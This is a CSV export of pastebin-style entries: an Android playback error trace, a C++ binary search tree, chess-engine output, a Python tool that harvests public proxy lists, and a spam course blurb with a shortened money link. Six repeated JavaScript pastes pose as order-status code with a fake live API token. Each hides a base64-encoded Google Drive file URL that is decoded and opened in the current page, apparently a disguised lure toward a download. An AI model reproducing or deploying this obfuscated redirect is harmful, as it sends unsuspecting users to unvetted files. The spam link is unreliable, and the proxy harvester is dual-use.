id,title,username,language,date,content
0YhDD06x,2025-04-11T20:42:03.654,powerampache,PHP,Friday 11th of April 2025 01:42:04 PM CDT,"1.01-76 (76) - DB: 83
androidx.media3.datasource.HttpDataSource$InvalidResponseCodeException: Response code: 502
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:401)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError Invalid response code 502 - Bad Gateway - HttpDataSource.InvalidResponseCodeException 
onPlayerError Invalid response code 502 - Bad Gateway
 {""headerFields"":{""null"":[""HTTP/1.1 502 Bad Gateway""],""Connection"":[""keep-alive""],""Content-Length"":[""157""],""Content-Type"":[""text/html""],""Date"":[""Fri, 11 Apr 2025 18:42:03 GMT""],""Referrer-Policy"":[""no-referrer""],""Server"":[""nginx/1.18.0""],""Strict-Transport-Security"":[""max-age\u003d31536000; includeSubDomains""],""X-Android-Received-Millis"":[""1744396923633""],""X-Android-Response-Source"":[""NETWORK 502""],""X-Android-Selected-Protocol"":[""http/1.1""],""X-Android-Sent-Millis"":[""1744396923584""],""X-Content-Type-Options"":[""nosniff""],""X-Download-Options"":[""noopen""],""X-Frame-Options"":[""SAMEORIGIN""],""X-Permitted-Cross-Domain-Policies"":[""none""],""X-Robots-Tag"":[""none""],""X-XSS-Protection"":[""1; mode\u003dblock""]},""responseBody"":[60,104,116,109,108,62,13,10,60,104,101,97,100,62,60,116,105,116,108,101,62,53,48,50,32,66,97,100,32,71,97,116,101,119,97,121,60,47,116,105,116,108,101,62,60,47,104,101,97,100,62,13,10,60,98,111,100,121,62,13,10,60,99,101,110,116,101,114,62,60,104,49,62,53,48,50,32,66,97,100,32,71,97,116,101,119,97,121,60,47,104,49,62,60,47,99,101,110,116,101,114,62,13,10,60,104,114,62,60,99,101,110,116,101,114,62,110,103,105,110,120,47,49,46,50,55,46,52,60,47,99,101,110,116,101,114,62,13,10,60,47,98,111,100,121,62,13,10,60,47,104,116,109,108,62,13,10],""responseCode"":502,""responseMessage"":""Bad Gateway"",""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2004,""detailMessage"":""Response code: 502"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":401,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]}"
6i9S7rHW,Untitled,kammex,JavaScript,Friday 11th of April 2025 01:36:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/15652/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pnZ5UDkq,Products.js,kammex,JavaScript,Friday 11th of April 2025 01:21:12 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71534/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
aSv1967w,Order.js,kammex,JavaScript,Friday 11th of April 2025 01:05:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/94846/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
N2WtXWKn,BST insertion and searching,TOFSIR_IU,C++,Friday 11th of April 2025 12:53:43 PM CDT,"#include<bits/stdc++.h>
using namespace std;
#define endl ""\n"";
typedef struct tree
{
	int number;
	struct tree *leftChild;
	struct tree *rightChild;
}node;
node *root = NULL;
void insertNode(int value)
{
	node *tempNode;
	node *currentNode=NULL;
	node *parentNode=NULL;
	tempNode = (node *) malloc (sizeof(node));
	tempNode->number=value;
	if(root==NULL)
	{
		root=tempNode;
	}
	else
	{
		currentNode=root;
		while(1)
		{
			parentNode=currentNode;
			if(parentNode->number>value)
			{
				currentNode=parentNode->leftChild;
				if(currentNode==NULL)
				{
					parentNode->leftChild=tempNode;
					return;
				}
			}
			else
			{
				currentNode=parentNode->rightChild;
				if(currentNode==NULL)
				{
					parentNode->rightChild=tempNode;
					return;
				}
			}
		}
	}
}
bool BST(int item)
{
	node *currentNode=root;
	int flag=0;
	while(1)
	{
		if(currentNode->number==item)
		{
			return true;
		}
		else if(currentNode->number<item)
		currentNode=currentNode->rightChild;
		else
		currentNode=currentNode->leftChild;
		if(currentNode==NULL)
		return false;
	}
}
int main()
{
	ios_base::sync_with_stdio(false);
    cin.tie(NULL);
    cout.tie(NULL);
    int n;
    cin>>n;
    while(n--)
    {
    	int a;
    	cin>>a;
    	insertNode(a);
	}
	cout<<""Insertion done""<<endl;
	int item;
	cin>>item;
	if(BST(item))
	{
		cout<<item<<"" is found""<<endl;
	}
	else
	{
		cout<<item<<"" is not found""<<endl;
	}
}"
my0fEkFW,Market.js,kammex,JavaScript,Friday 11th of April 2025 12:50:28 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/97885/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hV9ebasn,Untitled,kammex,JavaScript,Friday 11th of April 2025 12:35:00 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66450/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pFiic4S9,[Ver3.0 Supported GUI] FRESH HTTP(s)Proxy collection program by Python,r1rk,Python,Friday 11th of April 2025 12:28:23 PM CDT,"# This program does not support languages other than Japanese. Please do not be offended.
# You can run this program to get a list of up to about 300,000 or more proxies.

import tkinter as tk
from tkinter import ttk, messagebox
from datetime import datetime, timedelta
import requests
import threading
import re
import json
import os
 
ALL_PROXIES = set()
 
def get_past_dates(days=31):
    today = datetime.utcnow()
    return [(today - timedelta(days=i)).strftime(""%Y-%m-%d"") for i in range(days)]
 
def fetch_checkerproxy(date):
    try:
        url = f""https://api.checkerproxy.net/v1/landing/archive/{date}""
        res = requests.get(url, timeout=10)
        if res.status_code == 200:
            data = res.json()
            proxies = data['data'].get('proxyList', [])
            return proxies, True
        else:
            return [], False
    except:
        return [], False
 
def extract_from_text_url(url):
    try:
        res = requests.get(url, timeout=10)
        return re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}:\d+\b', res.text)
    except:
        return []
 
def extract_from_json_url(url, ip_key=""IP"", port_key=""PORT""):
    try:
        res = requests.get(url, timeout=10)
        data = res.json()
        proxies = []
        for entry in data.get(""LISTA"", []):
            ip = entry.get(ip_key)
            port = entry.get(port_key)
            if ip and port:
                proxies.append(f""{ip}:{port}"")
        return proxies
    except:
        return []
 
def collect_proxies(log_widget, progress_bar, progress_label):
    global ALL_PROXIES
    ALL_PROXIES = set()
    now = datetime.now().strftime(""%Y-%m-%d_%H-%M"")
    folder = ""proxies_tool_result""
    if not os.path.exists(folder):
        os.makedirs(folder)
 
    filename_txt = os.path.join(folder, f""httpProxies_{now}.txt"")
    filename_json = os.path.join(folder, f""httpProxies_{now}.json"")
 
    dates = get_past_dates(31)
    skipped_dates = []
 
    log_widget.insert(tk.END, ""=== CheckerProxyの取得を開始します。 ===\n"")
    for i, date in enumerate(dates):
        proxies, success = fetch_checkerproxy(date)
        if success and proxies:
            ALL_PROXIES.update(proxies)
            log_widget.insert(tk.END, f""{date} の取得完了。 ({len(proxies)}件)\n"")
        else:
            skipped_dates.append(date)
            log_widget.insert(tk.END, f""{date} は取得できませんでした。\n"")
        progress_bar[""value""] = (i + 1) / len(dates) * 50
        progress_label.config(text=f""{int(progress_bar['value'])}%"")
        log_widget.yview_moveto(1)
        log_widget.update()
 
    log_widget.insert(tk.END, ""\n=== 他ソースからの取得を開始します。 ===\n"")
 
    proxy_sources = [
        ""https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS.txt"",
        ""https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"",
        ""https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt"",
        ""https://api.openproxylist.xyz/http.txt"",
        ""https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt"",
        ""https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"",
        ""https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt"",
        ""https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"",
        ""https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt"",
        ""https://rootjazz.com/proxies/proxies.txt"",
        ""https://proxyspace.pro/http.txt"",
        ""https://alexa.lr2b.com/proxylist.txt"",
        ""https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt""
        
    ]
 
    offset = 50 / len(proxy_sources)
    for idx, url in enumerate(proxy_sources):
        log_widget.insert(tk.END, f""{url} から取得中...\n"")
        proxies = extract_from_text_url(url)
        ALL_PROXIES.update(proxies)
        progress_bar[""value""] += offset
        progress_label.config(text=f""{int(progress_bar['value'])}%"")
        log_widget.yview_moveto(1)
        log_widget.update()
 
    log_widget.insert(tk.END, f""\n=== 合計取得件数: {len(ALL_PROXIES)} 件 ===\n"")
 
    with open(filename_txt, ""w"") as f:
        f.write(""\n"".join(sorted(ALL_PROXIES)))
 
    with open(filename_json, ""w"") as f:
        json.dump(sorted(ALL_PROXIES), f, indent=2)
 
    log_widget.insert(tk.END, f""\n保存完了: {filename_txt}, {filename_json}\n"")
    log_widget.yview_moveto(1)
    log_widget.update()
 
    stop_btn.pack(pady=5)
    stop_btn.config(state=""normal"")
 
def stop_application():
    root.quit()
 
def start_collection():
    threading.Thread(target=collect_proxies, args=(log_text, progress, progress_label), daemon=True).start()
 
root = tk.Tk()
root.title(""proxies_collect_tool"")
root.geometry(""640x480"")
 
label = tk.Label(root, text=""HTTP(s) Proxy収集ツール"", font=(""Meiryo"", 14, ""bold""))
label.pack(pady=10)
 
progress = ttk.Progressbar(root, length=500, mode='determinate')
progress.pack(pady=5)
 
progress_label = tk.Label(root, text=""0%"", font=(""Meiryo"", 10))
progress_label.place(relx=0.5, rely=0.3, anchor=""center"")
 
btn = tk.Button(root, text=""Go!"", command=start_collection, font=(""Meiryo"", 12))
btn.pack(pady=5)
 
log_text = tk.Text(root, height=20, wrap=tk.WORD)
log_text.pack(fill=tk.BOTH, padx=10, pady=10, expand=True)
 
stop_btn = tk.Button(root, text=""終了"", command=stop_application, font=(""Meiryo"", 12), state=""disabled"")
 
root.mainloop()"
Gqtf4zqL,amazonka netaha optimalne,max2201111,Python,Friday 11th of April 2025 12:21:29 PM CDT,"Šachový engine s čistým minimaxem
=================================
Analyzuji pozici: 8/8/8/a7/2k1C3/8/8/K7 b - - 0 1

Počáteční pozice:
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 a . . . . . . . 5
4 . . k . C . . . 4
3 . . . . . . . . 3
2 . . . . . . . . 2
1 K . . . . . . . 1
  a b c d e f g h
Na tahu je: Černý
Hloubka 1: Čas = 0.374s, Dokončeno!
Hloubka 2: Čas = 0.126s, Dokončeno!
Hloubka 3: Čas = 1.920s, Dokončeno!as: 18:46:49
Nalezen mat v hloubce 3!

Tah 1: Černý - Král c4-b3
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 a . . . . . . . 5
4 . . . . C . . . 4
3 . k . . . . . . 3
2 . . . . . . . . 2
1 K . . . . . . . 1
  a b c d e f g h

Tah 2: Bílý - Kardinál e4-a4
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 a . . . . . . . 5
4 C . . . . . . . 4
3 . k . . . . . . 3
2 . . . . . . . . 2
1 K . . . . . . . 1
  a b c d e f g h

Tah 3: Černý - Amazonka a5-e1
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . . . . 5
4 C . . . . . . . 4
3 . k . . . . . . 3
2 . . . . . . . . 2
1 K . . . a . . . 1
  a b c d e f g h

Šach mat!

Kompletní matová posloupnost:
1. Černý: Král c4-b3
2. Bílý: Kardinál e4-a4
3. Černý: Amazonka a5-e1"
vyDCS1kq,JavaScript: the ULTIMATE training,f0f077,JavaScript,Friday 11th of April 2025 12:20:53 PM CDT,"JavaScript: the ULTIMATE training
Master JavaScript with the most comprehensive course online! Projects, exercises, quizzes, ES8, and more!
What you will learn
Using AJAX requests
Understanding how to use jQuery
Have everything you need to REALLY master JavaScript
Add, modify, delete DOM elements
for more:http://earnow.online/19R15b"
CadYuh7q,Products.js,kammex,JavaScript,Friday 11th of April 2025 12:17:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/89597/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
